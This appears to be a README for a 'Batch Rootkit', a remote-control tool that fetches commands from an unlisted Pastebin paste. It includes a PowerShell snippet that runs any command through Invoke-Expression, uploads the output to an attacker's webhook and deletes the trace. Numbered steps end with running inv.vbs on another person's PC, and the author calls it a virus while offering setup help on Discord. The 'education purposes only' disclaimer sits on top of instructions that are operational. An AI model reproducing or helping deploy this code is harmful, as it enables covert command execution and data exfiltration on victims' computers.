# Batch Rootkit

> __Warning__ 
> **I hereby declare that I am not liable for any damages caused by the program. If you experience any problems with my code, feel free to reach out to me on Discord.**


> __Warning__ 
> **ITS EDUCATION PURPOSES ONLY**


## Contact
In case you require any assistance with my project, please do not hesitate to contact me on Discord.
**Code613 on discord**

## About project
Batch rootkit is using pastebin paste to control computer. You can use all powershell and cmd commends.

##How to use
1. Create account on Create paste on https://pastebin.com/
2. Create paste on https://pastebin.com/
3. Make paste to unlisted
4. Change your webhook url and commend that you want to use
```PowerShell
$webhookUrl = "Your webhook url"
$outputFile = "output.txt"
$command = "Commend you want to use"
Invoke-Expression "$command | Out-File -FilePath $outputFile"
#tasklist | Out-File -FilePath $outputFile
$client = New-Object System.Net.WebClient
$client.UploadFile($webhookUrl, $outputFile)
Remove-Item $outputFile
 ```
5. To use cmd commend use ```cmd /c```  to use powershell commend just use your commend without ```cmd /c```
6. Save your paste
7. Press raw button
8. Copy link
9. Paste this link into batch code
10. Run inv.vbs on other pc
11. Done
12. If you need help i can show you how to setup this **VIRUS** for **EDUCATION PURPOSES ONLY** so feel free to contact me on my discord.

